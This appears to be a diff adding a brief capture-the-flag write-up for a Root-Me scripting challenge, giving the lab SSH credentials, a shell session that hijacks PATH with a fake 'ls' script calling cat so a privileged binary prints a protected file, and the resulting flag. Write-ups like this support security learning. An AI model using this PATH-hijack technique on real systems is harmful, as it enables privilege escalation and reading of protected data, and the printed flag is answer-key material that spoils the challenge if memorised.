@@ -1,0 +1,12 @@
+user: app-script-ch12
+pass: app-script-ch12
+
+$ssh -p 2222 app-script-ch12@challenge02.root-me.org
+
+app-script-ch12@challenge02:~$ /bin/cat /tmp/ajeandouble2/ls
+#!/bin/sh
+/bin/cat $2
+app-script-ch12@challenge02:~$ /bin/chmod +x /tmp/ajeandouble2/ls
+app-script-ch12@challenge02:~$ PATH=/tmp/ajeandouble2
+app-script-ch12@challenge02:~$ ./ch12
+8a95eDS/*e_T#
